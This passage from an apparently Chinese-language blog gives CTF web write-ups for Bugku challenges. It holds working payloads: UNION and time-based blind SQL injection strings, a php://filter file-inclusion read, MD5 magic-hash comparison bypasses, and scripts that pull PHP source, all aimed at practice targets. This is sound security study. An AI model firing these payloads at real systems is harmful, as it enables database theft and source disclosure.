class="string">%65%73%74%22%29%2e%6f%6e%73%75%62%6d%69%74%3d%63%68%65%63%6b%53%75%62%6d%69%74%3b'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> urllib.unquote(a+b)</span><br></pre></td></tr></table></figure>

<p>得到代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkSubmit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">var</span> a=document.getElementById(<span class="string">"password"</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="string">"undefined"</span>!=typeof a)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="string">"67d709b2b54aa2aa648cf6e87a7114f1"</span>==a.value)<span class="keyword">return</span>!<span class="number">0</span>;</span><br><span class="line">  alert(<span class="string">"Error"</span>);</span><br><span class="line">  a.focus();</span><br><span class="line">  <span class="keyword">return</span>!<span class="number">1</span>&#125;</span><br><span class="line">&#125;</span><br><span class="line">document.getElementById(<span class="string">"levelQuest"</span>).onsubmit=checkSubmit;</span><br></pre></td></tr></table></figure>

<p>可以看出这里已经暴露了password，返回输入即可。</p>
<h2 id="flag在index里面"><a href="#flag在index里面" class="headerlink" title="flag在index里面"></a>flag在index里面</h2><p>点击链接，看url：file=show.Php，参数file是关键，<br>本地包含(include)：file=php：//filter/read=convert.base64-encode/resource=index.php,</p>
<p>有关于这些协议的内容要好好看看</p>
<h2 id="输入密码得到flag"><a href="#输入密码得到flag" class="headerlink" title="输入密码得到flag"></a>输入密码得到flag</h2><p>用burpsuite直接打</p>
<h2 id="点击一百万次"><a href="#点击一百万次" class="headerlink" title="点击一百万次"></a>点击一百万次</h2><p>  使用hackbar使用post动作：click = 1000001就得到了flag</p>
<h2 id="备份是个好习惯"><a href="#备份是个好习惯" class="headerlink" title="备份是个好习惯"></a>备份是个好习惯</h2><h3 id="知识点补充"><a href="#知识点补充" class="headerlink" title="知识点补充"></a>知识点补充</h3><p>  $_SEVRER函数<br>  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$SERVER[<span class="string">"$QUERY_STRING"</span>]</span><br><span class="line"><span class="comment">//获取查询语句也就是？之后的内容</span></span><br><span class="line"></span><br><span class="line">$SERBER[<span class="string">"REQUEST_URI"</span>]</span><br><span class="line"><span class="comment">//用来获取URL中的路径地址部分（不是url！）例如：http://www.hujuntao.com/index.php?p=3</span></span><br><span class="line"><span class="comment">//$_SERVER['REQUEST_URI']获得的就是/index.php?p=3这部分</span></span><br><span class="line"></span><br><span class="line">$_SERVER[<span class="string">"HTTP_X_REWRITE_URL"</span>]</span><br><span class="line"><span class="comment">//在IIS下功能同上，在apache环境下显示为空</span></span><br><span class="line"></span><br><span class="line">$SERVER[<span class="string">"SCRIPT_NAME"</span>]</span><br><span class="line"><span class="comment">//获取当前脚本的路径，比如“/aaa/index.php”</span></span><br><span class="line"></span><br><span class="line">$_SERVER[<span class="string">"PHP_SELF"</span>]</span><br><span class="line"><span class="comment">//正在执行的脚本名，比如“/aaa/index.php”</span></span><br></pre></td></tr></table></figure></p>
<p>  str function</p>
  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">strstr($_SERVER[<span class="string">'REQUEST_URI'</span>], <span class="string">'?'</span>)</span><br><span class="line"><span class="comment">//return the string after '?' (include '?')</span></span><br><span class="line"></span><br><span class="line">substr($str,<span class="number">1</span>)</span><br><span class="line"><span class="comment">//return the string after the first symbol</span></span><br><span class="line"></span><br><span class="line">str_replace(<span class="string">'key'</span>,<span class="string">''</span>,$str)</span><br><span class="line"><span class="comment">//replace the 'key' in str to ''</span></span><br><span class="line"></span><br><span class="line">parse_str($str)</span><br><span class="line"><span class="comment">//parse the str</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> example:</span><br><span class="line"></span><br><span class="line">    $str = <span class="string">"first=value&amp;arr[]=foo+bar&amp;arr[]=baz"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 推荐用法</span></span><br><span class="line">    parse_str($str, $output);</span><br><span class="line">    <span class="keyword">echo</span> $output[<span class="string">'first'</span>];  <span class="comment">// value</span></span><br><span class="line">    <span class="keyword">echo</span> $output[<span class="string">'arr'</span>][<span class="number">0</span>]; <span class="comment">// foo bar</span></span><br><span class="line">    <span class="keyword">echo</span> $output[<span class="string">'arr'</span>][<span class="number">1</span>]; <span class="comment">// baz</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 不建议这么用</span></span><br><span class="line">    parse_str($str);</span><br><span class="line">    <span class="keyword">echo</span> $first;  <span class="comment">// value</span></span><br><span class="line">    <span class="keyword">echo</span> $arr[<span class="number">0</span>]; <span class="comment">// foo bar</span></span><br><span class="line">    <span class="keyword">echo</span> $arr[<span class="number">1</span>]; <span class="comment">// baz</span></span><br></pre></td></tr></table></figure>

<p>  回到bugku题目：备份是个好习惯</p>
<p>  打开界面发现只有一串字符串<br>  <img src="assets/markdown-img-paste-20181124212115114.png" alt></p>
<p>  搜索index.php.bak可以看到源码：<br>  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by PhpStorm.</span></span><br><span class="line"><span class="comment"> * User: Norse</span></span><br><span class="line"><span class="comment"> * Date: 2017/8/6</span></span><br><span class="line"><span class="comment"> * Time: 20:22</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"flag.php"</span>;</span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = strstr($_SERVER[<span class="string">'REQUEST_URI'</span>], <span class="string">'?'</span>);<span class="comment">//get string before "?"</span></span><br><span class="line">$str = substr($str,<span class="number">1</span>);                      <span class="comment">//get string after the second symbol</span></span><br><span class="line">$str = str_replace(<span class="string">'key'</span>,<span class="string">''</span>,$str);          <span class="comment">//replace 'key' to '' in str</span></span><br><span class="line">parse_str($str);</span><br><span class="line"><span class="keyword">echo</span> md5($key1);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> md5($key2);</span><br><span class="line"><span class="keyword">if</span>(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag.<span class="string">"取得flag"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>  然后分析构造payload，这里有一个知识点，用MD5加密的过程中，如果两个字符经MD5加密后的值为 0exxxxx形式，就会被认为是科学计数法，且表示的是0*10的xxxx次方，还是零，都是相等的。</p>
<p>  下列的字符串的MD5值都是0e开头的：</p>
<p>  QNKCDZO</p>
<p>  240610708</p>
<p>  s878926199a</p>
<p>  s155964671a</p>
<p>  s214587387a</p>
<p>比较md5(username),md5(password),md5(code)类型和值，双等于存在漏洞的原因其实是，0E开头的MD5值php解析器会解析为numerical strings，在双等于（==）情况下，会先判断类型，识别为numerical strings，会强制转换为数字，所以0e开头的MD5值都为0，所以才能绕过，然而三等于就比较有脾气了，必须一对一的核对两个字符串，不存在什么类型转换问题，所以开头0e相同，后面不同，也就不满足了</p>
<p>  所以构造payload：<br>  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line">index.php?kkey1=QNKCDZO&amp;kkey2=240610708</span><br></pre></td></tr></table></figure></p>
<p>  按下回车就得到了flag</p>
<p>  另：有一个扫描查看源码泄露的脚本，使用指南和下载地址如下：<br>  <a href="https://coding.net/u/yihangwang/p/SourceLeakHacker/git?public=true" target="_blank" rel="noopener">https://coding.net/u/yihangwang/p/SourceLeakHacker/git?public=true</a></p>
<h2 id="成绩单"><a href="#成绩单" class="headerlink" title="成绩单"></a>成绩单</h2><p>  <img src="assets/markdown-img-paste-20181124221811221.png" alt></p>
<p>  判断是数据库的问题，一开始犯蠢在url框里面写payload。。。。<br>根据昨天所学的知识，我们先输入1，可以输出成绩单。然后输入1’发现失败，<br>在尾部添加一个#又可以正常显示了。Emmmm。。。然后由于成绩单里面有三个列，<br>所以从3开始试试看看到底有几个列。。。。<br>最终在输入-1’ union select 1,2,3,4#的时候能够显示出内容，由此确定了有四列。</p>
<p>这个地方有点迷：同样是post形式，<br>在查询框里面输入1’#就可以但是在hackbar里面写id=1‘#就不行，<br>然而用id=1也是可以正常显示的。。。这个地方很是让我困惑，<br>后来的payload也是在查询框里面写的。<br>第二个问题是，同样是注释，为啥#就可以起作用但是–+就不行，<br>考虑到题目的类型（水题），感觉不太可能是过滤掉了。。。很迷。。。。</p>
<p>已解决：–+的‘+’的意思是url中的空格，真实的注释仅仅是–</p>
<p><img src="assets/markdown-img-paste-20181124222217760.png" alt></p>
<p>做完这一切后就可以开始了：<br>首先是查到所有数据库的名字<br>-1’ union select 1,2,group_concat(schema_name),4 from information_schema.schemata#  得到了数据库名字有一个叫做skctf_flag的<br>接下来，通过数据库名字查找表名<br>-1’ union select 1,2,group_concat(table_name),4 from information_schema.tables where table_schema=’skctf_flag’#        得到了一个叫做fl4g的一个表<br>接下来通过表明找列名<br>-1’ union select 1,2,group_concat(column_name),4 from information_schema.columns where table_name=’fl4g’# 得到了一个列名字叫做skctf_flag<br>最后通过列名找到内容<br>-1’union select 2,3,group_concat(skctf_flag),4 from skctf_flag.fl4g#<br>得到flag</p>
<p><img src="assets/markdown-img-paste-20181124222231565.png" alt></p>
<h2 id="cookie欺骗"><a href="#cookie欺骗" class="headerlink" title="cookie欺骗"></a>cookie欺骗</h2><p>看到网址里面filename后面是base64编码的东西，尝试解码看到是keys.txt<br>改成index.php试一试，然后这里有一个line参数，随便输个1什么的，可以看到有php代码返回<br>（有一个困惑就是输入0不返回最开始的&lt;?php）然后构造低端脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment">#http://123.206.87.240:8002/web11/index.php?line=&amp;filename=aW5kZXgucGhw</span></span><br><span class="line"></span><br><span class="line">url1 = <span class="string">'http://123.206.87.240:8002/web11/index.php?line='</span></span><br><span class="line">url2 = <span class="string">'&amp;filename=aW5kZXgucGhw'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> para <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">20</span>):</span><br><span class="line">    url = url1 + repr(para) + url2</span><br><span class="line">    print(requests.get(url).content)</span><br></pre></td></tr></table></figure>

<p>得到了以下代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$file=base64_decode(<span class="keyword">isset</span>($_GET[<span class="string">'filename'</span>])?$_GET[<span class="string">'filename'</span>]:<span class="string">""</span>);</span><br><span class="line">$line=<span class="keyword">isset</span>($_GET[<span class="string">'line'</span>])?intval($_GET[<span class="string">'line'</span>]):<span class="number">0</span>;<span class="comment">//这里应该是base进制转换，line为空的话默认设置为0</span></span><br><span class="line"><span class="keyword">if</span>($file==<span class="string">''</span>) header(<span class="string">"location:index.php?line=&amp;filename=a2V5cy50eHQ="</span>);</span><br><span class="line">$file_list = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">'0'</span> =&gt;<span class="string">'keys.txt'</span>,</span><br><span class="line"><span class="string">'1'</span> =&gt;<span class="string">'index.php'</span>,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">'margin'</span>]) &amp;&amp; $_COOKIE[<span class="string">'margin'</span>]==<span class="string">'margin'</span>)&#123;</span><br><span class="line">$file_list[<span class="number">2</span>]=<span class="string">'keys.php'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(in_array($file, $file_list))&#123;</span><br><span class="line">$fa = file($file);<span class="comment">//应该是打开文件的意思，文件应该是在同级目录下</span></span><br><span class="line"><span class="keyword">echo</span> $fa[$line];</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后这是别人的获取代码脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">s=requests.Session()</span><br><span class="line">url=<span class="string">'http://120.24.86.145:8002/web11/index.php'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">    payload=&#123;<span class="string">'line'</span>:str(i),<span class="string">'filename'</span>:<span class="string">'aW5kZXgucGhw'</span>&#125;</span><br><span class="line">    a=s.get(url,params=payload).content</span><br><span class="line">    content=str(a,encoding=<span class="string">"utf-8"</span>)</span><br><span class="line">    print(content)</span><br></pre></td></tr></table></figure>

<p>嗯人家的正规很多啊</p>
<p>然后这里就是要post一个cookie，其中的参数是margin=margin,而且要把filename设置为<br>keys.php的base64编码形式。这个就在burpsuite中操作：</p>
<p><img src="assets/markdown-img-paste-20181123214727533.png" alt></p>
<h2 id="bugku–insert-into"><a href="#bugku–insert-into" class="headerlink" title="bugku–insert into"></a>bugku–insert into</h2><p>the injection point is as follows:</p>
<blockquote>
<p>$sql=”insert into client_ip (ip) values (‘$ip’)”;</p>
</blockquote>
<p>the $ip comes from “x-forwarded-for”</p>
<p>and before this code, the symbol ‘,’ has been filtered in our input;</p>
<p>payload are as followed:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">127.0.0.1+(<span class="keyword">select</span> <span class="keyword">case</span> <span class="keyword">when</span> <span class="keyword">substr</span>((<span class="keyword">select</span> flag <span class="keyword">from</span> flag) <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>)=<span class="string">'C'</span> <span class="keyword">then</span> <span class="keyword">sleep</span>(<span class="number">5</span>) <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">end</span>)<span class="comment">-- +</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>the ‘+’ on the tail is not for annotation,instead it exists for the blank space before<br>,because the posted data’s last space will be ignored ,but adding another symbol after the space<br>can avoid it.</p>
</blockquote>
<h2 id="快速反弹post类型"><a href="#快速反弹post类型" class="headerlink" title="快速反弹post类型"></a>快速反弹post类型</h2><p>正则表达式内容补充：</p>
<h2 id="查询方式"><a href="#查询方式" class="headerlink" title="查询方式"></a>查询方式</h2><p>re.findall(pattern, string[, flags]) ：返回string中所有与pattern相匹配的全部字串，返回形式为数组。（查询多次）</p>
<p>re.finditer(pattern, string[, flags]) ：<br>返回string中所有与pattern相匹配的全部字串，返回形式为迭代器。</p>
<p>re.search(pattern, string[, flags])：若string中包含pattern子串，则返回Match对象，否则返回None，注意，如果string中存在多个pattern子串，只返回第一个。<br>_sre.SRE_Match对象可以用.span()来过滤信息返回元组。</p>
<p>re.match(pattern, string[, flags])：<br>从首字母开始开始匹配，string如果包含pattern子串，则匹配成功，返回Match对象，失败则返回None，若要完全匹配，pattern要以$结尾。</p>
<h2 id="查看方式"><a href="#查看方式" class="headerlink" title="查看方式"></a>查看方式</h2><p>group():group()相当于group(0)，将整个匹配结果作为一个元组并返回，于括号无关。<br>group(n)返回第n个括号最后一次匹配的结果。这个有点难理解，举例</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=<span class="string">"123abc456"</span></span><br><span class="line">print(re.search(<span class="string">"([0-9])*([a-z])*([0-9]*)"</span>,a).group(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">//输出结果<span class="string">'3'</span></span><br></pre></td></tr></table></figure>

<p>groups():m.groups() == (m.group(1), …)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">print(re.search(<span class="string">"([0-9])*([a-z])*([0-9]*)"</span>).groups());</span><br><span class="line">//输出的是(<span class="string">'3'</span>,<span class="string">'c'</span>,<span class="string">'456'</span>)</span><br></pre></td></tr></table></figure>

<h2 id="正题1：秋名山老司机"><a href="#正题1：秋名山老司机" class="headerlink" title="正题1：秋名山老司机"></a>正题1：秋名山老司机</h2><p>题目中让我们在两秒内算出一个式子。</p>
<p>多刷新几次会发现提示让我们post数据上去（新套路get：多刷新几次）</p>
<p>编写的python脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://123.206.87.240:8002/qiumingshan/"</span></span><br><span class="line">hohoh = requests.session()</span><br><span class="line">hoho=hohoh.get(url)</span><br><span class="line">reg = <span class="string">"[\d*\+\-\*\/]&#123;3,&#125;"</span></span><br><span class="line">search = re.findall(reg,hoho.text)</span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">'value'</span>:eval(search[<span class="number">0</span>])&#125;</span><br><span class="line">flag = hohoh.post(url,data=data)</span><br><span class="line"><span class="keyword">print</span> flag.content.decode(<span class="string">'utf-8'</span>)</span><br><span class="line">//content返回二进制类型的数据，是bytes，text返回的是unicode类型的数据，是str</span><br><span class="line">//编码：从明文到其他形式的叫编码，从其他形式到明文的叫解码，比如text.encode(<span class="string">'utf-8'</span>)</span><br><span class="line">//text会把字母变成汉字，但是这是乱解码，要做一个逆过程，也就是编码回去</span><br><span class="line">//在cmd中的显示编码默认是gbk，从utf8到gbk强制转换会造成中文类型的乱码，解码为utf8即可</span><br></pre></td></tr></table></figure>

<p>一开始运行。没有flag，再后来多次运行，点啊点啊点啊终于出来了flag，问杨晨学长说是头部的问题，可能是cookie的问题？</p>
<h2 id="正题2：天下武功唯快不破"><a href="#正题2：天下武功唯快不破" class="headerlink" title="正题2：天下武功唯快不破"></a>正题2：天下武功唯快不破</h2><p>按照惯例，查看源码，看到了注释</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- please post what you find with parameter:key --&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后用开发者工具查看一下response头部信息，发现有flag字段信息出现</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">FLAG: UDBTVF9USElTX1QwX0NINE5HRV9GTDRHOnBpVzlaU2tQZw==</span><br></pre></td></tr></table></figure>

<p>根据尾巴上的两个等号判断是base64编码，尝试解码后看到</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">P0ST_THIS_T0_CH4NGE_FL4G:bIIWEyNiL</span><br></pre></td></tr></table></figure>

<p>于是写程序如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://ctf5.shiyanbar.com/web/10/10.php"</span></span><br><span class="line">headers = requests.get(url).headers</span><br><span class="line">key = base64.b64decode(headers[<span class="string">'FLAG'</span>]).split(<span class="string">':'</span>)[<span class="number">1</span>]</span><br><span class="line">key = &#123;<span class="string">'key'</span>:key&#125;</span><br><span class="line">print(requests.post(url,data = key).content.decode(<span class="string">'utf-8'</span>))</span><br></pre></td></tr></table></figure>

<p>有时间想试试用正则来写</p>
<p><a href="https://blog.csdn.net/joyfixing/article/details/79971667" target="_blank" rel="noopener">https://blog.csdn.net/joyfixing/article/details/79971667</a></p>
<h2 id="正题3：速度要快"><a href="#正题3：速度要快" class="headerlink" title="正题3：速度要快"></a>正题3：速度要快</h2><p>查看源码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!-- OK ,now you have to post the margin what you find --&gt;</span><br></pre></td></tr></table></figure>

<p>脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">a = requests.session()</span><br><span class="line">url = <span class="string">"http://123.206.87.240:8002/web6/"</span></span><br><span class="line">b = a.get(url)</span><br><span class="line">c = base64.b64decode(b.headers[<span class="string">'flag'</span>]).split(<span class="string">':'</span>)[<span class="number">1</span>]</span><br><span class="line">datapost = &#123;<span class="string">'margin'</span>:base64.b64decode(c)&#125;</span><br><span class="line">d = a.post(url,data=datapost)</span><br><span class="line"><span class="keyword">print</span> c</span><br><span class="line"><span class="keyword">print</span> d.content.decode(<span class="string">'utf8'</span>)</span><br></pre></td></tr></table></figure>

<h2 id="cookie欺骗-1"><a href="#cookie欺骗-1" class="headerlink" title="cookie欺骗"></a>cookie欺骗</h2><p>看到网址里面filename后面是base64编码的东西，尝试解码看到是keys.txt<br>改成index.php试一试，然后这里有一个line参数，随便输个1什么的，可以看到有php代码返回<br>（有一个困惑就是输入0不返回最开始的&lt;?php）然后构造低端脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment">#http://123.206.87.240:8002/web11/index.php?line=&amp;filename=aW5kZXgucGhw</span></span><br><span class="line"></span><br><span class="line">url1 = <span class="string">'http://123.206.87.240:8002/web11/index.php?line='</span></span><br><span class="line">url2 = <span class="string">'&amp;filename=aW5kZXgucGhw'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> para <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">20</span>):</span><br><span class="line">    url = url1 + repr(para) + url2</span><br><span class="line">    print(requests.get(url).content)</span><br></pre></td></tr></table></figure>

<p>得到了以下代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$file=base64_decode(<span class="keyword">isset</span>($_GET[<span class="string">'filename'</span>])?$_GET[<span class="string">'filename'</span>]:<span class="string">""</span>);</span><br><span class="line">$line=<span class="keyword">isset</span>($_GET[<span class="string">'line'</span>])?intval($_GET[<span class="string">'line'</span>]):<span class="number">0</span>;<span class="comment">//这里应该是base进制转换，line为空的话默认设置为0</span></span><br><span class="line"><span class="keyword">if</span>($file==<span class="string">''</span>) header(<span class="string">"location:index.php?line=&amp;filename=a2V5cy50eHQ="</span>);</span><br><span class="line">$file_list = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">'0'</span> =&gt;<span class="string">'keys.txt'</span>,</span><br><span class="line"><span class="string">'1'</span> =&gt;<span class="string">'index.php'</span>,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">'margin'</span>]) &amp;&amp; $_COOKIE[<span class="string">'margin'</span>]==<span class="string">'margin'</span>)&#123;</span><br><span class="line">$file_list[<span class="number">2</span>]=<span class="string">'keys.php'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(in_array($file, $file_list))&#123;</span><br><span class="line">$fa = file($file);<span class="comment">//应该是打开文件的意思，文件应该是在同级目录下</span></span><br><span class="line"><span class="keyword">echo</span> $fa[$line];</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后这是别人的获取代码脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">s=requests.Session()</span><br><span class="line">url=<span class="string">'http://120.24.86.145:8002/web11/index.php'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">    payload=&#123;<span class="string">'line'</span>:str(i),<span class="string">'filename'</span>:<span class="string">'aW5kZXgucGhw'</span>&#125;</span><br><span class="line">    a=s.get(url,params=payload).content</span><br><span class="line">    content=str(a,encoding=<span class="string">"utf-8"</span>)</span><br><span class="line">    print(content)</span><br></pre></td></tr></table></figure>

<p>嗯人家的正规很多啊</p>
<p>然后这里就是要post一个cookie，其中的参数是margin=margin,而且要把filename设置为<br>keys.php的base64编码形式。这个就在burpsuite中操作：</p>
<p><img src="assets/markdown-img-paste-20181123214727533.png" alt></p>
<h2 id="never-give-up"><a href="#never-give-up" class="headerlink" title="never give up"></a>never give up</h2><p>查看源代码，看见注释<!--1p.html--></p>
<p>修改url，进入的是ctf的主页，在viewsource中修改代码，得到了另一个网页的源代码，查找得到<br>可能是重定向。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">HTML</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">HEAD</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span> <span class="attr">LANGUAGE</span>=<span class="string">"Javascript"</span>&gt;</span></span><br><span class="line">&lt;!--</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> Words =<span class="string">"%3Cscript%3Ewindow.location.href%3D%27http%3A//www.bugku.com%27%3B%3C/script%3E%20%0A</span></span></span><br><span class="line">%3C%21--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI</span><br><span class="line">3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCU</span><br><span class="line">zRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQ</span><br><span class="line">lNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0Q</span><br><span class="line">lMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI</span><br><span class="line">5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTN</span><br><span class="line">CJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW5</span><br><span class="line">0cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyU</span><br><span class="line">yMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3R</span><br><span class="line">ybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJ</span><br><span class="line">DMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTI</span><br><span class="line">xJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCU</span><br><span class="line">wQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB</span><br><span class="line">1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ%3D%3D--%3E"</span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">OutWord</span>(<span class="params"></span>)</span></span></span><br><span class="line">&#123;</span><br><span class="line"><span class="javascript"><span class="keyword">var</span> NewWords;</span></span><br><span class="line"><span class="javascript">NewWords = <span class="built_in">unescape</span>(Words);<span class="comment">//unescape()函数可对通过 escape()编码的字符串进行解码。</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//该函数的工作原理是这样的：通过找到形式为 %xx 和 %uxxxx 的字符序列（x 表示十六进制的数字），</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//用 Unicode 字符 \u00xx 和 \uxxxx 替换这样的字符序列进行解码。</span></span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.write(NewWords);</span></span><br><span class="line"><span class="javascript"><span class="comment">//把东西直接写道html页面里面</span></span></span><br><span class="line">&#125;</span><br><span class="line">OutWord();</span><br><span class="line"><span class="javascript"><span class="comment">// --&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">HEAD</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">BODY</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">BODY</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">HTML</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>那个一大串的东西是url编码的东西（观察到开头和结尾部分可能是一对注释的头尾）。<br>在python中解码如下：</p>
